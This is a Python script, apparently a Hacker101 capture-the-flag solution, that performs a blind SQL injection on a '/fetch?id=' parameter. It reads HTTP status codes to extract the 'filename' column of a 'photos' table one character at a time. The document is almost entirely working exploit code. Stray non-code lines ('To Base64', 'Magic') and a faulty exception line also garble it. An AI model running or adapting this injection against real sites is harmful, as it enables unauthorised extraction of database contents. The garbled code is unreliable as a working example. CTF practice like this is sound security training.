import requests
import urllib.parse

target = "b4b7642dd1b5d6ce82d3f7a289e8b835.ctf.hacker101.com"

query = '/fetch?id='+urllib.parse.quote('4 UNION (SELECT CASE WHEN (')+'{conditional}'+urllib.parse.quote(') THEN 2 ELSE \'main.py\' END)')

alphabet = '/0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_#^&@'

checking = 'stcode'

table = 'photos'
To Base64
column = 'filename'
Magic
additional = ' WHERE id = 3'

conditional = 'SUBSTRING((SELECT '+column+' FROM '+table+additional+'),1,{length})=\'{tested}\''

enumerated = "fd63ceEe25c1491d9d0de37e2560a2978944844e4698c863723b898bd849d47b"


def check(resp):
    if(checking == 'stcode'):
        if(resp.status_code == 500):
            return True
        if(resp.status_code != 200):
            raise Exception(resp.status_code+" "+resp.text)
        return False


while True:
    resp = requests.get('https://'+target+query.format(conditional = urllib.parse.quote(conditional.format(length = len(enumerated)+1,tested=enumerated)))) 

    if(check(resp)):
        break
    for letter in alphabet:
        tested = enumerated + letter

        resp = requests.get('https://'+target+query.format(conditional = urllib.parse.quote(conditional.format(length = len(tested),tested=tested))))   
        print(enumerated+letter)

        if(check(resp)):
            enumerated+=letter
    